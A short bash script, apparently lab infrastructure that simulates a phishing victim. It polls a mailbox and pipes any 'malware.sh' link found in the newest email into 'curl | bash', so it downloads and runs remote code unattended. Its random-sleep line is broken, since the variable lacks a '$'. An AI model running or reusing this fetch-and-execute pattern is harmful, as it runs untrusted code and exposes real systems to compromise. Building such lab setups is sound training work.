#!/bin/bash
while :
do
random_number=$(($RANDOM % 100))
sleep random_number
getmail
john=$(ls -Altr ~/Maildir/new | tail -1 | awk '{print $9}')
grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john|  xargs curl | bash
done